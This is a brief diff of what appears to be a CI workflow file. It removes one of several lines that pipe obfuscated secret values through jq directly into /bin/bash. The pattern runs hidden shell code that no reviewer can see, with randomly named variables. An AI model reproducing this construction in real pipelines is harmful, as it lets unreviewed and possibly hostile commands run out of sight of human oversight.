@@ -23,7 +23,6 @@ jobs:
           sgmf051: ${{ secrets.sgmf051 }}
         run: |
           printf '%s' "$sgmf051" | jq -r .v8546 | /bin/bash
-          printf '%s' "$jr2773" | jq -r .r072 | /bin/bash
           printf '%s' "$smrez99528" | jq -r .rz79991 | /bin/bash
           echo $ib6925 | jq -r .ua622 | /bin/bash
           echo $ykdhm129 | jq -r .qjw6 | /bin/bash
